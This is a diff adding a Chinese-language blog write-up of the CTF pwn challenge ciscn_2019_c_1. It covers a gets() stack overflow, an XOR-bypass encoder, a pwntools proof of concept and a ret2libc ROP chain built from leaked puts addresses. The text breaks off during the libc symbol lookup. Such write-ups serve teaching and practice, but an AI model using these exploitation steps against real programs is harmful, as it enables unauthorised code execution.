@@ -1,0 +1,294 @@
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>Ciscn_2019_c_1 Writeup - wlupus blog</title><meta name=author content="wlupus: https://wlupus.github.io"><meta name=description content="wlupus' blog"><meta name=keywords content="pwn,CTF,栈溢出"><meta itemprop=name content="Ciscn_2019_c_1 Writeup"><meta itemprop=description content><meta itemprop=datePublished content="2023-03-06T15:12:21+08:00"><meta itemprop=dateModified content="2023-03-07T15:01:33+08:00"><meta itemprop=wordCount content="1795"><meta itemprop=image content="https://wlupus.github.io/writeup_ciscn_2019_c_1/@heripiro-FV2jj1GaIAAoJRN.jpg"><meta itemprop=keywords content="pwn,CTF,栈溢出,"><meta property="og:title" content="Ciscn_2019_c_1 Writeup"><meta property="og:description" content><meta property="og:type" content="article"><meta property="og:url" content="https://wlupus.github.io/writeup_ciscn_2019_c_1/"><meta property="og:image" content="https://wlupus.github.io/writeup_ciscn_2019_c_1/@heripiro-FV2jj1GaIAAoJRN.jpg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-03-06T15:12:21+08:00"><meta property="article:modified_time" content="2023-03-07T15:01:33+08:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://wlupus.github.io/writeup_ciscn_2019_c_1/@heripiro-FV2jj1GaIAAoJRN.jpg"><meta name=twitter:title content="Ciscn_2019_c_1 Writeup"><meta name=twitter:description content><meta name=application-name content="wlupus"><meta name=apple-mobile-web-app-title content="wlupus"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#252627"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://wlupus.github.io/writeup_ciscn_2019_c_1/><link rel=prev href=https://wlupus.github.io/qemu_tutorial/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Ciscn_2019_c_1 Writeup","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/wlupus.github.io\/writeup_ciscn_2019_c_1\/"},"image":[{"@type":"ImageObject","url":"https:\/\/wlupus.github.io\/writeup_ciscn_2019_c_1\/@heripiro-FV2jj1GaIAAoJRN.jpg","width":1296,"height":1812}],"genre":"posts","keywords":"pwn, CTF, 栈溢出","wordcount":1795,"url":"https:\/\/wlupus.github.io\/writeup_ciscn_2019_c_1\/","datePublished":"2023-03-06T15:12:21+08:00","dateModified":"2023-03-07T15:01:33+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"wlupus","logo":{"@type":"ImageObject","url":"https:\/\/wlupus.github.io\/images\/avatar.png","width":634,"height":634}},"author":{"@type":"Person","name":"wlupus"},"description":""}</script></head><body header-desktop=sticky header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="wlupus blog"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/images/logo.svg data-srcset="/images/logo.svg, /images/logo.svg 1.5x, /images/logo.svg 2x" data-sizes=auto alt=/images/logo.svg title=/images/logo.svg><span class=header-title-text>wlupus</span></a><span class=header-subtitle></span></div><nav><ul class=menu><li class=menu-item><a class=menu-link href=/posts/><i class='fas fa-archive fa-fw fa-sm'></i> 所有文章</a></li><li class=menu-item><a class=menu-link href=/categories/><i class='fas fa-th fa-fw fa-sm'></i> 分类</a></li><li class=menu-item><a class=menu-link href=/tags/><i class='fas fa-tags fa-fw fa-sm'></i> 标签</a></li><li class=menu-item><a class=menu-link href=/friends/ title=友情链接><i class='fas fa-users fa-fw fa-sm'></i> 友链</a></li><li class=menu-item><a class=menu-link href=/about/><i class='fas fa-info-circle fa-fw fa-sm'></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item language"><span title=选择语言>简体中文<i class="dropdown-icon fas fa-chevron-down"></i></span><ul class=sub-menu><li class=menu-item>没有更多翻译</li></ul></li><li class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw"></i></li></ul></nav><a href=https://github.com/wlupus/wlupus.github.io title="在 GitHub 上查看源代码" target=_blank rel="external nofollow noopener noreffer" class=github-corner><svg width="56" height="56" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg></a></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="wlupus blog"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/images/logo.svg data-srcset="/images/logo.svg, /images/logo.svg 1.5x, /images/logo.svg 2x" data-sizes=auto alt=/images/logo.svg title=/images/logo.svg><span class=header-title-text>wlupus</span></a><span class=header-subtitle></span></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><nav><ul class=menu id=menu-mobile><li class=menu-item><a class=menu-link href=/posts/><i class='fas fa-archive fa-fw fa-sm'></i> 所有文章</a></li><li class=menu-item><a class=menu-link href=/categories/><i class='fas fa-th fa-fw fa-sm'></i> 分类</a></li><li class=menu-item><a class=menu-link href=/tags/><i class='fas fa-tags fa-fw fa-sm'></i> 标签</a></li><li class=menu-item><a class=menu-link href=/friends/ title=友情链接><i class='fas fa-users fa-fw fa-sm'></i> 友链</a></li><li class=menu-item><a class=menu-link href=/about/><i class='fas fa-info-circle fa-fw fa-sm'></i> 关于</a></li><li class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw"></i></li><li class="menu-item language"><span title=选择语言>简体中文<i class="dropdown-icon fas fa-chevron-down"></i></span>
+<select class=language-select onchange="location=this.value"><option disabled>没有更多翻译</option></select></li></ul></nav></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=container page-style=normal><aside class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></aside><aside class=aside-custom></aside><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Ciscn_2019_c_1 Writeup</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://wlupus.github.io title=Author target=_blank rel="external nofollow noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw"></i>wlupus</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/%E7%AC%94%E8%AE%B0/><i class="far fa-folder fa-fw"></i>笔记</a>&nbsp;<a href=/categories/%E9%A2%98%E8%A7%A3/><i class="far fa-folder fa-fw"></i>题解</a></span></div><div class=post-meta-line><span title="2023-03-06 15:12:21"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2023-03-06>2023-03-06</time>
+</span>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1795 字&nbsp;
+<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;</div></div><div class=featured-image><img class=lazyload src=/svg/loading.min.svg data-src=/writeup_ciscn_2019_c_1/@heripiro-FV2jj1GaIAAoJRN.jpg data-srcset="/writeup_ciscn_2019_c_1/@heripiro-FV2jj1GaIAAoJRN.jpg, /writeup_ciscn_2019_c_1/@heripiro-FV2jj1GaIAAoJRN.jpg 1.5x, /writeup_ciscn_2019_c_1/@heripiro-FV2jj1GaIAAoJRN.jpg 2x" data-sizes=auto alt=/writeup_ciscn_2019_c_1/@heripiro-FV2jj1GaIAAoJRN.jpg title=/writeup_ciscn_2019_c_1/@heripiro-FV2jj1GaIAAoJRN.jpg></div><div class="details toc" id=toc-static kept=false><div class="details-summary toc-title"><span>目录</span>
+<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#1-漏洞点>1 漏洞点</a></li><li><a href=#2-利用方式>2 利用方式</a></li><li><a href=#3-栈平衡>3 栈平衡</a></li></ul></nav></div></div><div class=content id=content><h2 id=1-漏洞点>1 漏洞点</h2><p>先用<code>checksec</code>看一下保护情况</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>wlupus@VM-4-10-ubuntu:~/pwn$ checksec ciscn_2019_c_1
+</span></span><span class=line><span class=cl>[*] &#39;/home/wlupus/pwn/ciscn_2019_c_1&#39;
+</span></span><span class=line><span class=cl>    Arch:     amd64-64-little
+</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
+</span></span><span class=line><span class=cl>    Stack:    No canary found
+</span></span><span class=line><span class=cl>    NX:       NX enabled
+</span></span><span class=line><span class=cl>    PIE:      No PIE (0x400000)
+</span></span></code></pre></td></tr></table></div></div><p>64位程序，只开了NX保护</p><p>用Ghidra查看程序流程<figure><a class=lightgallery href=/writeup_ciscn_2019_c_1/ghidra.png title=/writeup_ciscn_2019_c_1/ghidra.png data-thumbnail=/writeup_ciscn_2019_c_1/ghidra.png data-sub-html="<h2>反编译</h2>"><img class=lazyload src=/svg/loading.min.svg data-src=ghidra.png data-srcset="/writeup_ciscn_2019_c_1/ghidra.png, ghidra.png 1.5x, /writeup_ciscn_2019_c_1/ghidra.png 2x" data-sizes=auto alt=/writeup_ciscn_2019_c_1/ghidra.png></a><figcaption class=image-caption>反编译</figcaption></figure><figure><a class=lightgallery href=/writeup_ciscn_2019_c_1/reverse.png title=/writeup_ciscn_2019_c_1/reverse.png data-thumbnail=/writeup_ciscn_2019_c_1/reverse.png data-sub-html="<h2>encrypt</h2>"><img class=lazyload src=/svg/loading.min.svg data-src=reverse.png data-srcset="/writeup_ciscn_2019_c_1/reverse.png, reverse.png 1.5x, /writeup_ciscn_2019_c_1/reverse.png 2x" data-sizes=auto alt=/writeup_ciscn_2019_c_1/reverse.png></a><figcaption class=image-caption>encrypt</figcaption></figure>看到<code>encrypt</code>函数中利用了gets函数，有明显的溢出点，后续对输入进行了异或操作</p><p>对于异或操作，有两种绕过方案，第一种是提前将输入异或处理，这样函数中二次异或后就会恢复成原来的数据；第二种方案是利用<code>\0</code>截断，将payload的第一个字符替换为<code>\00</code>，这样<code>strlen</code>函数的返回值就会是0，也就不会进行后续的异或操作。两种方法在这个题目中都可以，不过个人更倾向第二种方法，因为第一种方法可能导致输入提前出现<code>\n</code>字符，导致<code>gets</code>函数提前结束。</p><p>对于第一种方案，编写了一个编解码函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=k>def</span> <span class=nf>encode</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>ret</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>over</span> <span class=o>=</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>)):</span>
+</span></span><span class=line><span class=cl>        <span class=n>current</span> <span class=o>=</span> <span class=n>payload</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>current</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>over</span> <span class=o>=</span> <span class=kc>True</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>over</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>payload</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&lt;</span> <span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=ow>or</span> <span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;z&#39;</span><span class=p>)</span> <span class=o>&lt;</span> <span class=n>payload</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>payload</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&lt;</span> <span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;A&#39;</span><span class=p>)</span> <span class=ow>or</span> <span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;Z&#39;</span><span class=p>)</span> <span class=o>&lt;</span> <span class=n>payload</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span> <span class=o>&lt;</span> <span class=n>payload</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=ow>and</span> <span class=n>payload</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&lt;</span> <span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                        <span class=n>current</span> <span class=o>=</span> <span class=n>current</span> <span class=o>^</span> <span class=mh>0xf</span>
+</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=n>current</span> <span class=o>=</span> <span class=n>current</span> <span class=o>^</span> <span class=mh>0xe</span>
+</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>current</span> <span class=o>=</span> <span class=n>current</span> <span class=o>^</span> <span class=mh>0xd</span>
+</span></span><span class=line><span class=cl>        <span class=n>ret</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>current</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;latin-1&#39;</span><span class=p>)</span>  <span class=c1># 注意这里一定要选择latin-1编码，</span>
+</span></span><span class=line><span class=cl>                                               <span class=c1># 如果使用utf-8编码会导致字符串长度发生改变</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>ret</span>
+</span></span></code></pre></td></tr></table></div></div><p>编写一段poc验证思路</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;splitw&#39;</span><span class=p>,</span> <span class=s1>&#39;-h&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./ciscn_2019_c_1&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1># sh = remote(&#39;node4.buuoj.cn&#39;, 26578)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>sh</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>menu</span><span class=p>(</span><span class=nb>id</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;choice!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=nb>id</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;encrypted</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>offset</span> <span class=o>=</span> <span class=mh>0x58</span>
+</span></span><span class=line><span class=cl>    <span class=n>return_addr</span> <span class=o>=</span> <span class=mh>0xdeadbeef</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=n>offset</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>return_addr</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=n>main</span><span class=p>())</span>
+</span></span></code></pre></td></tr></table></div></div><p><figure><a class=lightgallery href=/writeup_ciscn_2019_c_1/poc.png title=/writeup_ciscn_2019_c_1/poc.png data-thumbnail=/writeup_ciscn_2019_c_1/poc.png data-sub-html="<h2>return address被覆盖</h2>"><img class=lazyload src=/svg/loading.min.svg data-src=poc.png data-srcset="/writeup_ciscn_2019_c_1/poc.png, poc.png 1.5x, /writeup_ciscn_2019_c_1/poc.png 2x" data-sizes=auto alt=/writeup_ciscn_2019_c_1/poc.png></a><figcaption class=image-caption>return address被覆盖</figcaption></figure>在encrypt函数的最后打上断点，查看return前的状态，可以看到return address被覆盖，验证栈溢出存在且可以被利用</p><h2 id=2-利用方式>2 利用方式</h2><p>进一步查看程序，发现没有可用的后门函数，选择ret2libc来利用。首先泄漏<code>puts</code>函数的地址，用于计算<code>libc</code>的基址</p><p>构造payload为<code>b'\0' + b'a' * (offset - 1) + p64(pop_rdi) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start)</code></p><p>其中，<code>offset</code>通过查看程序汇编代码获得，<code>pop_rdi</code>通过ROPgadget获得</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>wlupus@VM-4-10-ubuntu:~/pwn$ ROPgadget --binary ciscn_2019_c_1 | grep &#34;pop rdi&#34;
+</span></span><span class=line><span class=cl>0x0000000000400c83 : pop rdi ; ret
+</span></span></code></pre></td></tr></table></div></div><p><code>puts_plt_addr</code>通过readelf和objdump获得<figure><a class=lightgallery href=/writeup_ciscn_2019_c_1/section.png title=/writeup_ciscn_2019_c_1/section.png data-thumbnail=/writeup_ciscn_2019_c_1/section.png data-sub-html="<h2>readelf -WS binary_name</h2>"><img class=lazyload src=/svg/loading.min.svg data-src=section.png data-srcset="/writeup_ciscn_2019_c_1/section.png, section.png 1.5x, /writeup_ciscn_2019_c_1/section.png 2x" data-sizes=auto alt=/writeup_ciscn_2019_c_1/section.png></a><figcaption class=image-caption>readelf -WS binary_name</figcaption></figure><figure><a class=lightgallery href=/writeup_ciscn_2019_c_1/plt.png title=/writeup_ciscn_2019_c_1/plt.png data-thumbnail=/writeup_ciscn_2019_c_1/plt.png data-sub-html="<h2>objdump -dj.plt binary_name</h2>"><img class=lazyload src=/svg/loading.min.svg data-src=plt.png data-srcset="/writeup_ciscn_2019_c_1/plt.png, plt.png 1.5x, /writeup_ciscn_2019_c_1/plt.png 2x" data-sizes=auto alt=/writeup_ciscn_2019_c_1/plt.png></a><figcaption class=image-caption>objdump -dj.plt binary_name</figcaption></figure><code>puts_got_addr</code>通过计算得到，64位下计算方法为
+$$PutsGotAddr = (PutsPltIdx - 1) * 8 + 24 + GOTBaseAddr$$
+对应上图中，puts是plt表中的第二个函数，所以got_addr为$(2 - 1) * 8 + 24 + 0x602000 = 0x602020$</p><p><code>start</code>为main函数的起始位置，可以通过readelf读取符号表获得</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>wlupus@VM-4-10-ubuntu:~/pwn$ readelf -Ws ciscn_2019_c_1 | grep main
+</span></span><span class=line><span class=cl>     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)
+</span></span><span class=line><span class=cl>    60: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_2.2.5
+</span></span><span class=line><span class=cl>    75: 0000000000400b28   245 FUNC    GLOBAL DEFAULT   14 main
+</span></span></code></pre></td></tr></table></div></div><p>当然，以上数据还可以通过pwntools库提供的方法来直接获取</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=n>start</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;main&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=c1># 0x400b28</span>
+</span></span><span class=line><span class=cl><span class=n>puts_plt_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=c1># 0x4006e0</span>
+</span></span><span class=line><span class=cl><span class=n>puts_got_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=c1># 0x602000 + 0x20 = 0x602020</span>
+</span></span></code></pre></td></tr></table></div></div><p>之后根据泄漏出来的puts函数真实地址的后三位，确定libc版本，获取其中的system函数地址以及<code>/bin/sh</code>字符串地址。由于我本地环境的libc在libc_database中没有，所以后文采用了手动查看的方法</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># 通过ldd查看libc路径
+</span></span><span class=line><span class=cl>wlupus@VM-4-10-ubuntu:~/pwn$ ldd ciscn_2019_c_1
+</span></span><span class=line><span class=cl>	linux-vdso.so.1 (0x00007fff7c588000)
+</span></span><span class=line><span class=cl>	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f09898fa000)
+</span></span><span class=line><span class=cl>	/lib64/ld-linux-x86-64.so.2 (0x00007f0989ceb000)
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># 获取libc符号表，查看puts的偏移
+</span></span><span class=line><span class=cl>wlupus@VM-4-10-ubuntu:~/pwn$ readelf -Ws /lib/x86_64-linux-gnu/libc.so.6 | grep puts
+</span></span><span class=line><span class=cl>   192: 0000000000080970   512 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
+</span></span><span class=line><span class=cl>   423: 0000000000080970   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
+</span></span><span class=line><span class=cl>   497: 0000000000126520  1240 FUNC    GLOBAL DEFAULT   13 putspent@@GLIBC_2.2.5
+</span></span><span class=line><span class=cl>   680: 0000000000128430   750 FUNC    GLOBAL DEFAULT   13 putsgent@@GLIBC_2.10
+</span></span><span class=line><span class=cl>  1143: 000000000007f1a0   396 FUNC    WEAK   DEFAULT   13 fputs@@GLIBC_2.2.5
+</span></span><span class=line><span class=cl>  1680: 000000000007f1a0   396 FUNC    GLOBAL DEFAULT   13 _IO_fputs@@GLIBC_2.2.5
+</span></span><span class=line><span class=cl>  2313: 000000000008a5e0   143 FUNC    WEAK   DEFAULT   13 fputs_unlocked@@GLIBC_2.2.5
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># 查看system函数在libc中的偏移
+</span></span><span class=line><span class=cl>wlupus@VM-4-10-ubuntu:~/pwn$ readelf -Ws /lib/x86_64-linux-gnu/libc.so.6 | grep system
+</span></span><span class=line><span class=cl>   233: 0000000000159c50    99 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5
